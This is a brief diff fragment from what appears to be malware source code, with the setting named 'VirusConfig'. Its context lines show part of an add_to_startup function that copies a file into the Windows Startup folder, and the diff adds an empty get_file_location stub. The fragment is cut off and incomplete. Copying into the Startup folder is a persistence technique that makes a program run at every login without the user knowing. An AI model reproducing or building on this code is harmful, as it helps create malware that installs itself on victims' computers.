@@ -157,3 +157,5 @@ def add_to_startup():
     dst = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{VirusConfig.COPY_FILENAME}.{ext}"
 
     copy_file(src, dst)
+
+def get_file_location():
